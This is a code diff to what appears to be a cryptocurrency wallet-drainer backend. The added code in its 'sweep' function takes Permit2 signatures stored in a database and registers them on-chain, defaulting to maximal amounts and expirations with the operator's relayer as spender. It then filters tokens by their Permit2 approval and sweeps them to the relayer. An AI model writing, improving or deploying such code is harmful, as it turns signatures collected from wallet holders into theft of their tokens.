@@ -1396,7 +1396,33 @@ async function sweep(wallet) {
       .eq("chain", CHAIN)
       .single();
 
-    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
+    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details) && pbData.signature) {
+      // First: call permit2.permit() to register the stored AllowanceTransfer
+      // signature on-chain. This sets Permit2's internal allowances for the
+      // relayer so that transferFrom() calls below will succeed.
+      try {
+        const [p2Amount0] = await permit2.allowance(checksum, pbData.permit.details[0]?.token, relayerWallet.address);
+        if (p2Amount0 === 0n) {
+          // Allowance not yet set — register it now using the stored sig
+          log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances`);
+          const fee = await getFeeData();
+          const permitTx = await permit2.permit(
+            checksum,
+            {
+              details:    pbData.permit.details.map(d => ({ token: d.token, amount: BigInt(d.amount ?? (2n**160n-1n).toString()), expiration: Number(d.expiration ?? (2n**48n-1n).toString()), nonce: Number(d.nonce ?? 0) })),
+              spender:    pbData.permit.spender ?? relayerWallet.address,
+              sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
+            },
+            pbData.signature,
+            { gasLimit: 300_000n, ...fee }
+          );
+          await permitTx.wait();
+          log(`[allowance] ✅ permit() confirmed`);
+        }
+      } catch (e) {
+        err(`[allowance] permit() failed: ${e.reason ?? e.message} — trying transferFrom anyway`);
+      }
+
       for (const detail of pbData.permit.details) {
         try {
           const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
@@ -1470,6 +1496,41 @@ async function sweep(wallet) {
       }
 
       if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
+
+      // Pre-check ERC-20 allowance to Permit2 for each token via Multicall.
+      // SignatureTransfer.permitTransferFrom requires ERC20.allowance(owner,Permit2)>0.
+      // Without this check the tx reverts and wastes gas.
+      const ERC20_ALLOW_IFACE = new ethers.Interface(["function allowance(address,address) view returns (uint256)"]);
+      const allowChecks = await multicall3.aggregate3(
+        withBalance.map(p => ({
+          target:       p.token,
+          allowFailure: true,
+          callData:     ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
+        }))
+      ).catch(() => null);
+
+      if (allowChecks) {
+        const approved = [];
+        const skipped  = [];
+        for (let i = 0; i < withBalance.length; i++) {
+          const { success, returnData: data } = allowChecks[i];
+          let allow = 0n;
+          if (success && data && data !== "0x") {
+            try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch { /* ignore */ }
+          }
+          if (allow > 0n) {
+            approved.push(withBalance[i]);
+          } else {
+            skipped.push(withBalance[i].token.slice(0, 10));
+          }
+        }
+        if (skipped.length) {
+          log(`[gasless] ⚠️  ${skipped.length} token(s) skipped — ERC-20 allowance to Permit2 is 0 (user must approve Permit2 on-chain): ${skipped.join(", ")}`);
+        }
+        withBalance.splice(0, withBalance.length, ...approved);
+      }
+
+      if (withBalance.length === 0) { log(`[gasless] no tokens with Permit2 approval — skipping`); return; }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
       try {
